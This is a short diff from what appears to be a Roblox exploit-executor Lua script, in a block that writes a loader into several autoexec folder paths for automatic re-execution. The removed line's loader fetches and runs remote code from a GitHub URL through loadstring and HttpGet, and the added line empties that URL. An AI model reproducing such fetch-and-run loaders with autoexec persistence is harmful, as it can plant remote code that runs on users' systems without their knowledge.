@@ -1681,7 +1681,7 @@ end)
 
 -- Auto-execute: write a loader to all common autoexec paths
 pcall(function()
-    local loader = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/trttttttt/Something/refs/heads/main/Some3"))()'
+    local loader = 'loadstring(game:HttpGet(""))()'
     local paths  = {
         "autoexec/anigame.lua",
         "auto-exec/anigame.lua",
